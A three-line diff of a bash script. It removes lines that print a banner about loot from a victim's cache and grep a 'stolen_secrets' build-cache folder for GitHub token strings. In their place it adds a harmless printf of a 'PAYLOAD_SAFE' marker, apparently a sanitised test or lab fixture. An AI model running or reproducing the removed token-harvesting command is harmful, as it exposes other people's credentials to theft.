@@ -1,3 +1,2 @@
-#!/bin/bash
-echo "--- PLIJEN IZ KESA ZRTVE ---"
-cat build_cache/stolen_secrets/*.sh | grep -Eo "ghs_[A-Za-z0-9_]{36}"
+#!/usr/bin/env bash
+printf '%s\n' 'BB_CHECKOUT_V7_PAYLOAD_SAFE_20260802_R1'
